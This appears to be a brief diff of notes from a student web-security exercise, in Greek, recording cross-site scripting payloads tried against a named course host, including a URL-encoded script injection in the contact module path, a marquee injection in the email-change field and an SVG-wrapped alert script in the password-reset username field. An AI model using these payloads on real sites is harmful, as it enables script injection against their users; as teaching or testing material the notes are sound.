@@ -34,4 +34,9 @@ http://kalashnik0v.csec.chatzi.org/modules/contact/index.php/'%22%22%3E%3Cscript
 
 Αλλαγή email
 '">><marquee><h1>XSS</h1></marquee>
+
+Ξεχάσατε το συνθηματικό σας;
+Ονομα Χρήστη:
+TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
+------------------------------------------------------------
 ------------------------------------------- THANOS
